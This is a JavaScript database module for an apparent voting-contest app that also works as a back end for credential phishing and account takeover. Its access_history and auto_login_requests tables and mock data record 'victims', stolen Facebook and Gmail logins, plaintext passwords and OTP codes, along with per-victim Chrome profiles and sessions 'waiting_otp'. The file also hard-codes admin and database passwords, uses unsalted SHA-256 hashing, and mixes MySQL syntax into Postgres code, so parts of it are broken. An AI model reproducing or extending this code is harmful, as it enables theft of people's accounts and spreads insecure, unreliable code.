import pkg from "pg";
const { Pool } = pkg;
import crypto from "crypto";

// Database Configuration
class DatabaseManager {
  constructor() {
    this.pool = null;
    this.isInitialized = false;
    this.mockData = {
      users: [],
      contests: [],
      votes: [],
      sessions: [],
    };
  }

  // Password hashing compatible with authService.verifyPassword (salt:hash with PBKDF2)
  hashPassword(password) {
    try {
      const salt = crypto.randomBytes(16).toString("hex");
      const hash = crypto
        .pbkdf2Sync(password, salt, 10000, 64, "sha512")
        .toString("hex");
      return `${salt}:${hash}`;
    } catch (e) {
      // Fallback simple hash (not for production)
      return crypto.createHash("sha256").update(password).digest("hex");
    }
  }

  // Initialize database connection pool
  async initialize() {
    try {
      // Check if in development mode (no database required)
      if (
        process.env.NODE_ENV !== "production" &&
        !process.env.FORCE_DATABASE
      ) {
        console.log("🔧 Development mode: Using in-memory database fallback");
        this.initializeMockDatabase();
        this.isInitialized = true;
        return true;
      }

      const dbConfig = {
        connectionString:
          process.env.DATABASE_URL ||
          "postgresql://bvote_user:bvote_secure_2025@localhost:5432/bvote_production",
        host: process.env.DB_HOST || "localhost",
        port: process.env.DB_PORT || 5432,
        user: process.env.DB_USER || "bvote_user",
        password: process.env.DB_PASSWORD || "bvote_secure_2025",
        database: process.env.DB_NAME || "bvote_production",
      };

      this.pool = new Pool({
        ...dbConfig,
        ssl:
          process.env.NODE_ENV === "production"
            ? { rejectUnauthorized: false }
            : false,
        max: 20,
        idleTimeoutMillis: 30000,
        connectionTimeoutMillis: 2000,
      });

      // Test connection
      const client = await this.pool.connect();
      console.log("✅ PostgreSQL Database connected successfully");
      client.release();

      // Initialize database schema
      await this.initializeSchema();

      this.isInitialized = true;
      return true;
    } catch (error) {
      console.error("❌ Database connection failed:", error.message);
      console.log("🔧 Falling back to in-memory database for development");
      this.initializeMockDatabase();
      this.isInitialized = true;
      return true;
    }
  }

  // Initialize database schema
  async initializeSchema() {
    const tables = [
      // Users table
      `CREATE TABLE IF NOT EXISTS users (
        id VARCHAR(36) PRIMARY KEY,
        username VARCHAR(100) UNIQUE NOT NULL,
        password_hash VARCHAR(255) NOT NULL,
        role ENUM('SuperAdmin', 'Operator', 'Auditor', 'User') DEFAULT 'User',
        email VARCHAR(255),
        is_active BOOLEAN DEFAULT true,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
      )`,

      // Audit logs table
      `CREATE TABLE IF NOT EXISTS audit_logs (
        id VARCHAR(36) PRIMARY KEY,
        action VARCHAR(100) NOT NULL,
        user_id VARCHAR(36),
        details JSON,
        ip_address VARCHAR(45),
        user_agent TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE SET NULL
      )`,

      // Chrome profiles table
      `CREATE TABLE IF NOT EXISTS chrome_profiles (
        id VARCHAR(36) PRIMARY KEY,
        name VARCHAR(100) NOT NULL,
        profile_data JSON,
        is_active BOOLEAN DEFAULT true,
        created_by VARCHAR(36),
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
        FOREIGN KEY (created_by) REFERENCES users(id) ON DELETE SET NULL
      )`,

      // Contests table
      `CREATE TABLE IF NOT EXISTS contests (
        id VARCHAR(36) PRIMARY KEY,
        title VARCHAR(255) NOT NULL,
        description TEXT,
        start_date TIMESTAMP,
        end_date TIMESTAMP,
        status ENUM('draft', 'active', 'completed', 'cancelled') DEFAULT 'draft',
        settings JSON,
        created_by VARCHAR(36),
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
        FOREIGN KEY (created_by) REFERENCES users(id) ON DELETE SET NULL
      )`,

      // Contestants table
      `CREATE TABLE IF NOT EXISTS contestants (
        id VARCHAR(36) PRIMARY KEY,
        contest_id VARCHAR(36) NOT NULL,
        name VARCHAR(255) NOT NULL,
        description TEXT,
        image_url TEXT,
        vote_count INT DEFAULT 0,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (contest_id) REFERENCES contests(id) ON DELETE CASCADE
      )`,

      // Votes table
      `CREATE TABLE IF NOT EXISTS votes (
        id VARCHAR(36) PRIMARY KEY,
        contest_id VARCHAR(36) NOT NULL,
        contestant_id VARCHAR(36) NOT NULL,
        user_identifier VARCHAR(255),
        ip_address VARCHAR(45),
        user_agent TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (contest_id) REFERENCES contests(id) ON DELETE CASCADE,
        FOREIGN KEY (contestant_id) REFERENCES contestants(id) ON DELETE CASCADE
      )`,

      // System logs table
      `CREATE TABLE IF NOT EXISTS system_logs (
        id VARCHAR(36) PRIMARY KEY,
        level ENUM('info', 'warn', 'error', 'debug') DEFAULT 'info',
        message TEXT NOT NULL,
        data JSON,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )`,

      // Sessions table (for active sessions)
      `CREATE TABLE IF NOT EXISTS user_sessions (
        id VARCHAR(36) PRIMARY KEY,
        user_id VARCHAR(36) NOT NULL,
        token_hash VARCHAR(255) NOT NULL,
        expires_at TIMESTAMP NOT NULL,
        ip_address VARCHAR(45),
        user_agent TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
      )`,
    ];

    try {
      for (const tableQuery of tables) {
        await this.pool.execute(tableQuery);
      }
      console.log("✅ Database schema initialized");

      // Insert default admin users if not exists
      await this.insertDefaultUsers();
    } catch (error) {
      console.error("❌ Schema initialization failed:", error.message);
      throw error;
    }
  }

  // Insert default admin users - CLEAN PASSWORDS
  async insertDefaultUsers() {
    const defaultUsers = [
      {
        id: "admin-001",
        username: "admin",
        password: "bvote_admin_secure_2025",
        role: "SuperAdmin",
      },
      {
        id: "admin-002",
        username: "operator",
        password: "bvote_operator_secure_2025",
        role: "Operator",
      },
      {
        id: "admin-003",
        username: "auditor",
        password: "bvote_auditor_secure_2025",
        role: "Auditor",
      },
      {
        id: "admin-bot",
        username: "bot_agent",
        password: "bvote_bot_secure_2025",
        role: "SuperAdmin",
      },
    ];

    try {
      for (const user of defaultUsers) {
        const passwordHash = crypto
          .createHash("sha256")
          .update(user.password)
          .digest("hex");

        await this.pool.query(
          `INSERT INTO users (id, username, password_hash, role) VALUES ($1, $2, $3, $4) ON CONFLICT (username) DO NOTHING`,
          [user.id, user.username, passwordHash, user.role]
        );
      }
      console.log("✅ Default users inserted");
    } catch (error) {
      console.error("❌ Default users insertion failed:", error.message);
    }
  }

  // User management methods
  async getUserByUsername(username) {
    try {
      const [rows] = await this.pool.execute(
        "SELECT * FROM users WHERE username = ? AND is_active = true",
        [username]
      );
      return rows[0] || null;
    } catch (error) {
      console.error("Get user error:", error);
      return null;
    }
  }

  async createUser(userData) {
    try {
      const id = crypto.randomUUID();
      const passwordHash = crypto
        .createHash("sha256")
        .update(userData.password)
        .digest("hex");

      await this.pool.execute(
        "INSERT INTO users (id, username, password_hash, role, email) VALUES (?, ?, ?, ?, ?)",
        [
          id,
          userData.username,
          passwordHash,
          userData.role || "User",
          userData.email || null,
        ]
      );

      return { id, ...userData, password_hash: passwordHash };
    } catch (error) {
      console.error("Create user error:", error);
      return null;
    }
  }

  // Audit log methods
  async addAuditLog(action, userId, details = {}) {
    try {
      const id = crypto.randomUUID();
      await this.pool.execute(
        "INSERT INTO audit_logs (id, action, user_id, details, ip_address, user_agent) VALUES (?, ?, ?, ?, ?, ?)",
        [
          id,
          action,
          userId,
          JSON.stringify(details),
          details.ip || null,
          details.userAgent || null,
        ]
      );
      return id;
    } catch (error) {
      console.error("Add audit log error:", error);
      return null;
    }
  }

  async getAuditLogs(limit = 100, offset = 0) {
    try {
      const [rows] = await this.pool.execute(
        `SELECT al.*, u.username
         FROM audit_logs al
         LEFT JOIN users u ON al.user_id = u.id
         ORDER BY al.created_at DESC
         LIMIT ? OFFSET ?`,
        [limit, offset]
      );
      return rows;
    } catch (error) {
      console.error("Get audit logs error:", error);
      return [];
    }
  }

  // Contest management methods
  async createContest(contestData, createdBy) {
    try {
      const id = crypto.randomUUID();
      await this.pool.execute(
        "INSERT INTO contests (id, title, description, start_date, end_date, status, settings, created_by) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
        [
          id,
          contestData.title,
          contestData.description,
          contestData.startDate,
          contestData.endDate,
          contestData.status || "draft",
          JSON.stringify(contestData.settings || {}),
          createdBy,
        ]
      );
      return { id, ...contestData };
    } catch (error) {
      console.error("Create contest error:", error);
      return null;
    }
  }

  async getContests(status = null) {
    try {
      let query = "SELECT * FROM contests";
      let params = [];

      if (status) {
        query += " WHERE status = ?";
        params.push(status);
      }

      query += " ORDER BY created_at DESC";

      const [rows] = await this.query(query, params);
      return rows;
    } catch (error) {
      console.error("Get contests error:", error);
      return [];
    }
  }

  // Generic query method
  async query(sql, params = []) {
    if (!this.isInitialized) {
      await this.initialize();
    }

    if (!this.pool) {
      // Mock database fallback
      return this.mockQuery(sql, params);
    }

    try {
      const [rows] = await this.pool.execute(sql, params);
      return rows;
    } catch (error) {
      console.error("Database query error:", error);
      throw error;
    }
  }

  // Access History Methods
  async getAccessHistory(filters = {}) {
    if (!this.pool) {
      return this.mockData.access_history.filter((item) => {
        if (filters.status && item.status !== filters.status) return false;
        if (filters.victim_id && item.victim_id !== filters.victim_id)
          return false;
        return true;
      });
    }

    let sql = "SELECT * FROM access_history WHERE 1=1";
    const params = [];

    if (filters.status) {
      sql += " AND status = ?";
      params.push(filters.status);
    }
    if (filters.victim_id) {
      sql += " AND victim_id = ?";
      params.push(filters.victim_id);
    }
    if (filters.start_date) {
      sql += " AND timestamp >= ?";
      params.push(filters.start_date);
    }
    if (filters.end_date) {
      sql += " AND timestamp <= ?";
      params.push(filters.end_date);
    }

    sql += " ORDER BY timestamp DESC";

    try {
      const rows = await this.query(sql, params);
      return rows;
    } catch (error) {
      console.error("Get access history error:", error);
      return [];
    }
  }

  async createAccessHistory(data) {
    if (!this.pool) {
      const newEntry = {
        id: this.mockData.access_history.length + 1,
        ...data,
        timestamp: new Date().toISOString(),
      };
      this.mockData.access_history.push(newEntry);
      return newEntry;
    }

    const sql = `
      INSERT INTO access_history (victim_id, account, link_name, chrome_profile, status, action_type, ip_address, user_agent, notes)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    `;

    try {
      const result = await this.query(sql, [
        data.victim_id,
        data.account,
        data.link_name,
        data.chrome_profile,
        data.status || "pending",
        data.action_type,
        data.ip_address,
        data.user_agent,
        data.notes,
      ]);
      return { id: result.insertId, ...data };
    } catch (error) {
      console.error("Create access history error:", error);
      return null;
    }
  }

  async updateAccessHistory(id, updates) {
    if (!this.pool) {
      const index = this.mockData.access_history.findIndex(
        (item) => item.id === id
      );
      if (index !== -1) {
        this.mockData.access_history[index] = {
          ...this.mockData.access_history[index],
          ...updates,
        };
        return this.mockData.access_history[index];
      }
      return null;
    }

    const fields = Object.keys(updates)
      .map((key) => `${key} = ?`)
      .join(", ");
    const values = Object.values(updates);
    values.push(id);

    const sql = `UPDATE access_history SET ${fields} WHERE id = ?`;

    try {
      await this.query(sql, values);
      return { id, ...updates };
    } catch (error) {
      console.error("Update access history error:", error);
      return null;
    }
  }

  async updateAccessHistoryStatus(id, status, notes = "") {
    if (!this.pool) {
      const item = this.mockData.access_history.find((h) => h.id == id);
      if (item) {
        item.status = status;
        item.notes = notes;
        item.updated_at = new Date();
      }
      return item;
    }

    const sql =
      "UPDATE access_history SET status = ?, notes = ?, updated_at = NOW() WHERE id = ?";
    await this.query(sql, [status, notes, id]);
    return { id, status, notes };
  }

  // Chrome Profiles Methods
  async getChromeProfiles() {
    if (!this.pool) {
      return this.mockData.chrome_profiles;
    }

    try {
      const rows = await this.query(
        "SELECT * FROM chrome_profiles ORDER BY name"
      );
      return rows;
    } catch (error) {
      console.error("Get chrome profiles error:", error);
      return [];
    }
  }

  async createChromeProfile(profileData) {
    if (!this.pool) {
      const newProfile = {
        id: this.mockData.chrome_profiles.length + 1,
        ...profileData,
        created_at: new Date().toISOString(),
      };
      this.mockData.chrome_profiles.push(newProfile);
      return newProfile;
    }

    const sql = `
      INSERT INTO chrome_profiles (name, path, settings)
      VALUES (?, ?, ?)
    `;

    try {
      const result = await this.query(sql, [
        profileData.name,
        profileData.path,
        JSON.stringify(profileData.settings || {}),
      ]);
      return { id: result.insertId, ...profileData };
    } catch (error) {
      console.error("Create chrome profile error:", error);
      return null;
    }
  }

  async updateChromeProfile(id, data) {
    if (!this.pool) {
      const profile = this.mockData.chrome_profiles.find((p) => p.id == id);
      if (profile) {
        Object.assign(profile, data);
        profile.updated_at = new Date();
      }
      return profile;
    }

    const sql =
      "UPDATE chrome_profiles SET name = ?, user_agent = ?, settings = ?, updated_at = NOW() WHERE id = ?";
    await this.query(sql, [
      data.name,
      data.user_agent,
      JSON.stringify(data.settings || {}),
      id,
    ]);
    return { id, ...data };
  }

  async deleteChromeProfile(id) {
    if (!this.pool) {
      const index = this.mockData.chrome_profiles.findIndex((p) => p.id == id);
      if (index > -1) {
        this.mockData.chrome_profiles.splice(index, 1);
      }
      return true;
    }

    await this.query("DELETE FROM chrome_profiles WHERE id = ?", [id]);
    return true;
  }

  // Auto Login Requests Methods
  async getAutoLoginRequests(filters = {}) {
    if (!this.pool) {
      return this.mockData.auto_login_requests.filter((item) => {
        if (filters.status && item.status !== filters.status) return false;
        if (filters.user_id && item.user_id !== filters.user_id) return false;
        return true;
      });
    }

    let sql = "SELECT * FROM auto_login_requests WHERE 1=1";
    const params = [];

    if (filters.status) {
      sql += " AND status = ?";
      params.push(filters.status);
    }
    if (filters.user_id) {
      sql += " AND user_id = ?";
      params.push(filters.user_id);
    }

    sql += " ORDER BY created_at DESC";

    try {
      const rows = await this.query(sql, params);
      return rows;
    } catch (error) {
      console.error("Get auto login requests error:", error);
      return [];
    }
  }

  async createAutoLoginRequest(requestData) {
    if (!this.pool) {
      const newRequest = {
        id: this.mockData.auto_login_requests.length + 1,
        ...requestData,
        created_at: new Date().toISOString(),
        last_activity: new Date(),
        progress: 0,
        needs_intervention: false,
      };
      this.mockData.auto_login_requests.push(newRequest);
      return newRequest;
    }

    const sql = `
      INSERT INTO auto_login_requests
      (victim_id, website, username, status, ip_address, location, device)
      VALUES (?, ?, ?, ?, ?, ?, ?)
    `;
    const params = [
      data.victim_id,
      data.website,
      data.username,
      data.status || "pending",
      data.ip_address,
      data.location,
      data.device,
    ];

    const result = await this.query(sql, params);
    return { id: result.insertId, ...data };
  }

  async updateAutoLoginRequest(id, data) {
    if (!this.pool) {
      const request = this.mockData.auto_login_requests.find((r) => r.id == id);
      if (request) {
        Object.assign(request, data);
        request.last_activity = new Date();
      }
      return request;
    }

    const sql = `
      UPDATE auto_login_requests
      SET status = ?, progress = ?, needs_intervention = ?, intervention_type = ?, last_activity = NOW()
      WHERE id = ?
    `;
    await this.query(sql, [
      data.status,
      data.progress,
      data.needs_intervention,
      data.intervention_type,
      id,
    ]);
    return { id, ...data };
  }

  // Vote management methods
  async addVote(voteData) {
    try {
      const id = crypto.randomUUID();

      // Start transaction
      const connection = await this.pool.getConnection();
      await connection.beginTransaction();

      try {
        // Insert vote
        await connection.execute(
          "INSERT INTO votes (id, contest_id, contestant_id, user_identifier, ip_address, user_agent) VALUES (?, ?, ?, ?, ?, ?)",
          [
            id,
            voteData.contestId,
            voteData.contestantId,
            voteData.userIdentifier,
            voteData.ipAddress,
            voteData.userAgent,
          ]
        );

        // Update contestant vote count
        await connection.execute(
          "UPDATE contestants SET vote_count = vote_count + 1 WHERE id = ?",
          [voteData.contestantId]
        );

        await connection.commit();
        connection.release();

        return { id, ...voteData };
      } catch (error) {
        await connection.rollback();
        connection.release();
        throw error;
      }
    } catch (error) {
      console.error("Add vote error:", error);
      return null;
    }
  }

  // Initialize mock database for development
  initializeMockDatabase() {
    console.log("🔧 Initializing mock database with sample data");

    this.mockData = {
      users: [
        {
          id: 1,
          username: "admin",
          email: "admin@bvote.com",
          password_hash: this.hashPassword("bvote_admin_secure_2025"),
          role: "admin",
          created_at: new Date(),
          last_login: new Date(),
        },
        {
          id: 2,
          username: "user1",
          email: "user1@example.com",
          password_hash: this.hashPassword("user123"),
          role: "user",
          created_at: new Date(),
          last_login: new Date(),
        },
      ],
      contests: [
        {
          id: 1,
          title: "Cuộc thi Âm nhạc 2025",
          description: "Cuộc thi âm nhạc dành cho sinh viên",
          start_date: "2025-01-15",
          end_date: "2025-03-15",
          status: "active",
          created_by: 1,
          created_at: new Date(),
        },
      ],
      votes: [],
      sessions: [],
      access_history: [
        {
          id: 1,
          timestamp: new Date(),
          link_name: "Facebook Login Link #1",
          account: "user1@gmail.com | 0901234567 | Facebook",
          password: "password123",
          otp_code: "123456",
          ip_address: "192.168.1.100",
          status: "success",
          chrome_profile: "facebook-profile-1",
          is_test: false,
          victim_id: "Target_User_001",
        },
        {
          id: 2,
          timestamp: new Date(Date.now() - 300000),
          link_name: "Gmail Login Link #2",
          account: "user2@yahoo.com | 0907654321 | Gmail",
          password: "mypassword456",
          otp_code: "789012",
          ip_address: "192.168.1.101",
          status: "pending",
          chrome_profile: "gmail-profile-2",
          is_test: false,
          victim_id: "Target_User_002",
        },
      ],
      chrome_profiles: [
        {
          id: 1,
          name: "facebook-profile-1",
          path: "./chrome-profiles/facebook-profile-1",
          user_agent:
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
          created_at: new Date(),
          last_used: new Date(),
          is_active: true,
          settings: JSON.stringify({
            clearCookiesOnStart: false,
            clearHistoryOnStart: false,
            incognito: false,
            headless: false,
          }),
        },
        {
          id: 2,
          name: "gmail-profile-2",
          path: "./chrome-profiles/gmail-profile-2",
          user_agent:
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
          created_at: new Date(Date.now() - 86400000),
          last_used: new Date(Date.now() - 3600000),
          is_active: false,
          settings: JSON.stringify({
            clearCookiesOnStart: true,
            clearHistoryOnStart: true,
            incognito: false,
            headless: false,
          }),
        },
      ],
      auto_login_requests: [
        {
          id: 1,
          victim_id: "Target_User_001",
          website: "facebook.com",
          username: "user1@gmail.com",
          status: "waiting_otp",
          progress: 75,
          start_time: new Date(Date.now() - 600000),
          last_activity: new Date(Date.now() - 60000),
          ip_address: "192.168.1.100",
          location: "Hà Nội, VN",
          device: "Windows 11 - Chrome 120",
          needs_intervention: true,
          intervention_type: "otp_required",
          created_at: new Date(),
        },
      ],
    };
  }

  // Mock query method for development
  async mockQuery(sql, params = []) {
    console.log("🔧 Mock Query:", sql, params);

    // Simple mock responses
    if (sql.includes("SELECT 1 as health")) {
      return [[{ health: 1 }]];
    }

    if (sql.includes("SELECT") && sql.includes("users")) {
      return [this.mockData.users];
    }

    if (sql.includes("SELECT") && sql.includes("contests")) {
      return [this.mockData.contests];
    }

    // Default empty response
    return [[]];
  }

  // Connection health check
  async healthCheck() {
    try {
      if (this.pool) {
        const [rows] = await this.pool.execute("SELECT 1 as health");
        return rows[0]?.health === 1;
      } else {
        // Mock health check
        console.log("🔧 Mock health check passed");
        return true;
      }
    } catch (error) {
      console.error("Database health check failed:", error);
      return false;
    }
  }

  // Close connection
  async close() {
    if (this.pool) {
      await this.pool.end();
      console.log("Database connection closed");
    }
  }
}

export default new DatabaseManager();
